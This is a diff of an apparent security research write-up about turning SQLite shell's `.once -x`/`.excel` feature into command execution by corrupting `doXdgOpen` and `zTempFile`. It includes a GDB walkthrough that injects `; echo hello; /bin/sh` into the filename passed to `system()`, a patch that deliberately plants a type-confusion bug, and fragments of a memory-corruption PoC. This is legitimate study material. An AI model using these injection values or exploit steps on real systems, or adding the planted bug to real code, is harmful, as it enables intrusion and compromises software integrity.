@@ -26,6 +26,9 @@ Structure `ShellState` maintains the shell session information, where `doXdgOpen
 Here is the related code:
 
 ```c
+  // in sqlite3.c
+
+  // p is pointing to a ShellState structure
   if( p->doXdgOpen ){
     const char *zXdgOpenCmd = "xdg-open";
     char *zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);
@@ -33,19 +36,19 @@ Here is the related code:
   }
 ```
 
-If `p->doXdgOpen` is `true`, sqlite3 executes `sqlite3_mprintf()` to construct a command, and invokes `system(zCmd)` to execute the command.
+If `p->doXdgOpen` is `true`, it means the SQLite output was being redirected to a temporary file named by `p->zTempFile`. SQLite will open/start/xdg-open to open the file for users to check or save.
 
-* Normally, `doXdgOpen` is `false`
+* Normally, `p->doXdgOpen` is `false`
 * An attacker can modify `doXdgOpen` and `zTempFile` to execute any command on victim systems.
 
 
-## Description
+## Semantics Anlaysis
 
-### SQLite logic
-
-Structure `ShellState` for maintaining the shell status information: 
+Structure `ShellState` maintains the shell status information. Its defintion is as follows: 
 
 ```c
+// in shell.c
+
 /*
 ** State information about the database connection is contained in an
 ** instance of the following structure.
@@ -67,16 +70,10 @@ struct ShellState {
 };
 ```
 
-You can create a sqlite shell by simply typing `./sqlite3 [path-to-database-file]`. 
-
-By default, sqlite receives the SQL query (input to sqlite) from `stdin`, and prints the query results on `stdout`. Here is an example of the sqlite shell:
+Users can create a sqlite shell by simply typing `./sqlite3 [path-to-database-file]` or `./sqlite3`. By default, sqlite receives the SQL query (input to sqlite) from `stdin`, and prints the query results on `stdout`. Here is an example of the sqlite shell:
 
 ```bash
-$ sqlite3
-SQLite version 3.37.0 2021-12-09 01:34:53
-Enter ".help" for usage hints.
-Connected to a transient in-memory database.
-Use ".open FILENAME" to reopen on a persistent database.
+$ ./sqlite3
 sqlite> create table T (c int);
 sqlite> insert into T values (0), (1), (2);
 sqlite> select * from T;
@@ -85,22 +82,17 @@ sqlite> select * from T;
 2
 ```
 
-However, sometimes you may want to save the result to a file. sqlite supports this feature with the following options:
+However, sometimes you may want to save the query result into a file. sqlite supports this feature with the following options:
 
 ```sql
 sqlite> .help
-...
 .excel                   Display the output of next command in spreadsheet
-...
 .once ?OPTIONS? ?FILE?   Output for the next SQL command only to FILE
-...
 .output ?FILE?           Send output to FILE or stdout if FILE is omitted
-...
 .testcase NAME           Begin redirecting output to 'testcase-out.txt'
-...
 ```
 
-**More details are available at https://www.sqlite.org/cli.html#writing_results_to_a_file**
+More details are available at https://www.sqlite.org/cli.html#writing_results_to_a_file
 
 More than that, sometimes you may want to edit the result a little bit before saving them into the file system. No problem, sqlite provides the nice feature that will save the result into a temporary file and immediately opens that file for you:
 
@@ -117,9 +109,11 @@ sqlite> select * from T;   <------- try it
 
 After the last SQL query, sqlite will open the system text editor, which should contain the result of this query.
 
-The implementation details of this feature can be found in shell.c. What we care about is the code to open the system text editor, i.e., function `output_reset`:
+The implementation details of this feature is as follows. What we care about is the code for opening the system text editor in function `output_reset`:
 
 ```c
+// in shell.c
+
 /*
 ** Change the output file back to stdout.
 **
@@ -128,14 +122,14 @@ The implementation details of this feature can be found in shell.c. What we care
 ** launch start/open/xdg-open on that temporary file.
 */
 static void output_reset(ShellState *p){
-  if( p->outfile[0]=='|' ){
+  if (p->outfile[0] == '|'){
 #ifndef SQLITE_OMIT_POPEN
     pclose(p->out);
 #endif
-  }else{
+  } else {
     output_file_close(p->out);
 #ifndef SQLITE_NOHAVE_SYSTEM
-a.  if( p->doXdgOpen ){
+a.  if (p->doXdgOpen) {
       const char *zXdgOpenCmd =
 #if defined(_WIN32)
       "start";
@@ -145,10 +139,10 @@ a.  if( p->doXdgOpen ){
       "xdg-open";
 #endif
       char *zCmd;
-b.     zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);
-c.     if( system(zCmd) ){
+b.    zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);
+c.    if (system(zCmd)) {
         utf8_printf(stderr, "Failed: [%s]\n", zCmd);
-      }else{
+      } else {
         /* Give the start/open/xdg-open command some time to get
         ** going before we continue, and potential delete the
         ** p->zTempFile data file out from under it */
@@ -167,27 +161,23 @@ c.     if( system(zCmd) ){
 
 `output_reset` is the function that cleans up every thing and restores the output to the `stdout`. Pay attention to lines labeled with a, b, and c. In line a, sqlite checks whether `doXdgOpen` is set. This variable is set when the user types `.once -x` or `.once -e` or `.excel` (which means the user wants sqlite opens system text/excel editor to modify the result). If so, sqlite will move on to construct the command `zCmd`. `zXdgOpenCmd` is the system-specific command that automatically finds propoer applications to open particular-format files. On Linux system, the shell command is `xdg-open`, while on Mac, the shell command is `open`. The temporary file name is stored in `zTempFile`, which is a predefined string but can be updated by user command (this is why it is a variable, not a constant). At last, sqlite uses line c to run the command, which will pop up the window of either text editor or excel editor.
 
-## Attack in GDB
 
-## Attack
+## Attack Simulation via GDB
 
-Attacker sets `doXdgOpen` to `true` and set `zTempFile` to a string `; echo 'hello', /bin/sh`. Then, when execution continues, `echo 'hello'` and `/bin/sh` will be executed.
+To confirm the feasiblity of constructing attacks, we use GDB debugger simulate an attacker who can write arbitrary value into arbitrary location through common memory safety issues, like buffer overflow or use-after-free.
+
+In particular, we set `doXdgOpen` to `true` and set `zTempFile` to a malicious string `; echo 'hello'; /bin/sh`. Then, when the execution continues, `echo 'hello'` and `/bin/sh` will be executed.
 
 In the first step, start sqlite
 
 ```bash
 $ sqlite3
-SQLite version 3.37.0 2021-12-09 01:34:53
-Enter ".help" for usage hints.
-Connected to a transient in-memory database.
-Use ".open FILENAME" to reopen on a persistent database.
 sqlite>
 ```
 
 In another terminal, attach gdb to the process
 ```bash
 $ sudo gdb -p `pgrep sqlite3`
-...
 ```
 
 Go to the `main` function frame, and update the two members:
@@ -219,27 +209,22 @@ $4 = 0x7f3b44d42990 "; echo hello; /bin/sh"
 
 Attack done. Quite gdb
 
-```
+```bash
 (gdb) quit
-A debugging session is active.
-
-        Inferior 1 [process XXXX] will be detached.
-
-Quit anyway? (y or n) y
 ```
 
 Go to the sqlite shell, quite the shell
 
-```sql
+```bash
 sqlite> .exit
 sh: 1: xdg-open: not found
-hello
-$
+hello     #<- result of running "echo 'hello'"
+$         #<- result of runing "/bin/sh"
 ```
 
-## Attack in the wild
+## Attack via Real-world (Fixed) Bugs 
 
-### Gain arbitrary memory-write primitive
+#### 1. Gain arbitrary memory-write primitive
 
 There is a type confusion bug in SQLite that can provide arbitrary memory-write primitive.
 
@@ -257,9 +242,9 @@ static int fts3FunctionArg(
 ){
   int rc;
   /* Insert Vuln */
-+  Fts3Cursor *pRet;
-+  memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
-+  *ppCsr = pRet;
++ Fts3Cursor *pRet;
++ memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
++ *ppCsr = pRet;
 - *ppCsr = (Fts3Cursor*)sqlite3_value_pointer(pVal, "fts3cursor");
   if( (*ppCsr)!=0 ){
     rc = SQLITE_OK;
@@ -273,17 +258,19 @@ static int fts3FunctionArg(
 }
 ```
 
-### Compile SQLite
-```
+#### 2. Compile SQLite
+```bash
+# in sqlite folder
+
 CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
 make
 ```
 
-### PoC
+#### 3. Proof-of-Concept (PoC)
 
-We exploit the vulnerability twice to corrupt `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of p and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [poc.py](./poc.py).
+We exploit the vulnerability twice to corrupt `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of `p` and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [poc.py](./poc.py).
 
-```
+```bash
 # Corrupt p->doXdgOpen to 1
 # set zMalloc (dest of memcpy) in sqlite3_value
 exp = writeVal(exp, sqlite3_value_off + 0x40, doXdgOpen, 8)
